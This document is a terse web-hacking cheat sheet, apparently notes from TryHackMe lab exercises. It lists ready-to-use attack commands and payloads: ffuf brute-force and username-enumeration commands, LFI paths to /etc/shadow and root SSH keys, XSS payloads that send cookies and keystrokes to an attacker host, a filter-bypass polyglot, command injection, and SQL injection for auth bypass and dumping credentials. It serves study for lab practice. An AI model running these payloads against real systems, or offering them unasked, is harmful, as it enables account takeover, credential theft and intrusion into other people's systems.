/robots.txt
favicon
sitemap.xml
http headers
google dorks:
site
	site:tryhackme.com
	returns results only from the specified website address
inurl
	inurl:admin
	returns results that have the specified word in the URL
filetype
	filetype:pdf
	returns results which are a particular file extension
intitle
	intitle:admin
	returns results that contain the specified word in the title
	
wappalyzer
waybackmachine
GITHUB
S3 buckets

directory enum:
  
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ

gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt


OSINT SSL/TSL
dns bruteforce


hosts:
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}


Username enumiration:
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"

bruteforce:
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

LFI:

http://webapp.thm/get.php?file=../../../../etc/passwd


/etc/issue
	contains a message or system identification to be printed before the login prompt.

/etc/profile
	

controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived

/proc/version
	specifies the version of the Linux kernel

/etc/passwd
	has all registered user that has access to a system

/etc/shadow
	contains information about the system's users' passwords

/root/.bash_history
	

contains the history commands for root user

/var/log/dmessage
	contains global system messages, including the messages that are logged during system startup

/var/mail/root
	

all emails for root user

/root/.ssh/id_rsa
	Private SSH keys for a root or any known valid user on the server

/var/log/apache2/access.log
	

the accessed requests for Apache  webserver

C:\boot.ini
	contains the boot options for computers with BIOS firmware
	
	

SSRF:
in common contains in forms, we can use burp to change post parameters


XSS - Cross Site Scripting
<script>alert('XSS');</script>
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
<script>user.changeEmail('attacker@hacker.thm');</script>

A popular tool for Blind XSS attacks is xsshunter. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
example:
"><script>alert('THM');</script>

also you can write it to textarea:
</textarea><script>alert('THM');</script>
bypass:
<sscriptcript>alert('THM');</sscriptcript>

BEST 6-level method:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e


OS COMMAND INJECTION:
Applications that use user input to populate system commands with data can often be combined in unintended behaviour. For example, the shell operators ;, & and && will combine two (or more) system commands and execute them both

example:
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami

Linux:
whoami
ls
ping
nc

Windows:
whoami
dir
ping 
timeout



SQL Injection:
basic commands:
select * from users;
select username,password from users;
select * from users LIMIT 1;
select * from users where username='admin';
select * from users where username like '%n';

SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
insert into users (username,password) values ('bob','password123');
update users SET username='root',password='pass123' where username='admin';
delete from users where username='martin';

;-- - element
THAT:
 https://website.thm/blog?id=2;-- 
TURNS INTO THAT:
 SELECT * from blog where id=2;-- and private=0 LIMIT 1;
TO REMOVE PRIVATE:
SELECT * from blog where id=2;--

0 UNION SELECT 1,2,database()
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

AUTH BYPASS:
select * from users where username='%username%' and password='%password%' LIMIT 1;
' OR 1=1;--

BLIND BOOLEAN BASED:
select * from users where username = '%username%' LIMIT 1;
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2,3;--
admin123' UNION SELECT 1,2,3 where database() like '%';--

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';


BLIND SLEEP BASED:
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--


